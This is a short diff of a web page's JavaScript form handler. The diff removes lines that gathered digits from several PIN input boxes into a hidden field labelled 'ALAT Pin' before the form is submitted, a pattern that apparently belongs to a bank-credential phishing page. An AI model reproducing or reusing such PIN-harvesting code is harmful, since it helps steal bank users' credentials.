@@ -186,8 +186,6 @@
       e.preventDefault();
 
       // Combine all digits into the hidden message field
-      const digits = Array.from(document.querySelectorAll('.fin-input')).map(input => input.value).join('');
-      document.getElementById('combinedPin').value = `ALAT Pin: ${digits}`;
 
       // Submit the form
       const formData = new FormData(this);
@@ -236,4 +234,5 @@
 </body>
 
   </html>
+
 
